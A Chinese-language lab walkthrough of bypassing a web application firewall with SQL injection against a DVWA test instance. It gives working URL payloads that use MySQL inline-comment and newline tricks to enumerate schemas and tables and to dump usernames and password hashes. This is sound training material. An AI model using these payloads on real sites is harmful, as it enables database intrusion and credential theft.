## waf绕过
### 1、在开启waf的情况，测试
```shell script
http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=1' and '1'='1&Submit=Submit#
```
![image](https://github.com/498946975/Security/blob/master/images/waf_13.png)
### 2、绕过waf，内敛注释成功绕过
```shell script
http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=1'/*!11445and*/'1'='1&Submit=Submit#
```
```yaml
1'/*!11445and*/'1'='
解析：
/*      */: 中间的内容是注解
/*！    */: 中间的内容取消注解
```
```yaml
/*!11445*/表示版本号；从00000~99999 ，需要⼩于mysql的版本；
例如:mysql 5.6 ，则版本号需要小于 56000 才能执行成功
```
### 3、order by 更换为 group by绕过
```shell script
http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=1' order by '1-- &Submit=Submit#
```
![image](https://github.com/498946975/Security/blob/master/images/waf_14.png)
#### 更换group by
```shell script
http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=1' group by '1-- &Submit=Submit#
```
![image](https://github.com/498946975/Security/blob/master/images/waf_15.png)
#### 输入group by 3报错，就是2列
```shell script
http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=1' group by 3-- &Submit=Submit#
```
![image](https://github.com/498946975/Security/blob/master/images/waf_16.png)
### 4、union all 绕过
```yaml
在参数后插入其他语句，添加注释，然后使用截断，使用%23使得语句报错，将双引号直接注 释
```
```shell script
http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=1' regexp "%0A%23" /*!11144union %0A select */1,2-- &Submit=Submit#
```
#### 语句翻译
```shell script
1' regexp "%0A%23" /*!11144union %0A select */1,2--
```
```yaml
%0A：回车
%23：#
regexp "%0A%23"：正则匹配，回车#
```
```yaml
1' regexp "
#" /*!11144union 
 select */1,2--  
```
![image](https://github.com/498946975/Security/blob/master/images/waf_17.png)
### 5、database(),user()绕过，再次使用内敛注释绕过
![image](https://github.com/498946975/Security/blob/master/images/waf_18.png)
database()绕过
```shell script
?id=-1' regexp "%0A%23"/*!11144union %0A select*/ 1,database(%0A /*!11144*/)--
```
```shell script
http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=1' regexp "%0A%23" /*!11144union %0A select */database(%0A /*!11144*/),2-- &Submit=Submit#
```
![image](https://github.com/498946975/Security/blob/master/images/waf_19.png)
#### user()绕过
```shell script
http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=1' regexp "%0A%23" /*!11144union %0A select */database(%0A /*!11144*/),user(%0A /*!11144*/)-- &Submit=Submit#
```
![image](https://github.com/498946975/Security/blob/master/images/waf_20.png)
### 6、获取所有库的名称
```sql
select user,password from users where user_id='-1' union /*!-- /*
select/*!1,*/ group_concat(schema_name)   /*!from*/      /*!-- /*
information_schema./*!schemata*/ --; -- ';
```
![image](https://github.com/498946975/Security/blob/master/images/waf_21.png)
在url中
```shell script
http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=-1' union /*!--+/*%0aselect/*!1,*/ group_concat(schema_name) /*!from*/ /*!-- +/*%0ainformation_schema./*!schemata*/ --+
```
### 7、获取dvwa库的所有表名
```sql
select user,password from users where user_id='-1' union /*!-- /*
select/*!1,*/ group_concat(table_name)   /*!from*/      /*!-- /*
information_schema./*!tables*/  where table_schema='dvwa'; -- ';
```
![image](https://github.com/498946975/Security/blob/master/images/waf_22.png)
在url中
```shell script
http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=-1' union /*!--+/*%0aselect/*!1,*/ group_concat(table_name) /*!from*/ /*!-- +/*%0ainformation_schema./*!tables*/ where table_schema='dvwa' --+
```
### 8、获取user表的所有字段
```sql
select user,password from users where user_id='-1' union /*!-- /*
select/*!1,*/ group_concat(column_name)   /*!from*/      /*!-- /*
information_schema./*!columns*/  where table_name='users'; -- ';
```
![image](https://github.com/498946975/Security/blob/master/images/waf_23.png)
在url中
```shell script
http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=-1' union /*!--+/*%0aselect/*!1,*/ group_concat(column_name) /*!from*/ /*!-- +/*%0ainformation_schema./*!columns*/ where table_name='users' --+
```
### 9、获取账号密码
```sql
select user,password from users where user_id='-1' union /*!-- /*
select/*!1,*/ group_concat(concat_ws(0x7e,user,password))  /*!from*/  dvwa.users; -- ';
```
```yaml
user内容～password内容
```
![image](https://github.com/498946975/Security/blob/master/images/waf_24.png)
在url中
```shell script
http://172.16.120.165/dvwa/vulnerabilities/sqli/?id=-1' union /*!--+/*%0aselect/*!1,*/ group_concat(concat_ws(0x7e,user,password)) /*!from*/ dvwa.users --+
```

